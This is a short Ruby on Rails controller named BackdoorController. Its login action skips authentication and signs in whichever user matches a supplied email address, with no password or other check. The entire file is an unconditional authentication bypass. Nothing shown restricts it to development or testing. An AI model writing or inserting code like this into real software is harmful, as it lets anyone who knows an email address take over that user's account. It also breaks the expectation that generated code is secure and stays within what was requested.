class BackdoorController < ApplicationController
  skip_before_filter :authenticate

  def login
    user = User.find_by_email params[:email]
    sign_in_and_redirect user
  end
end

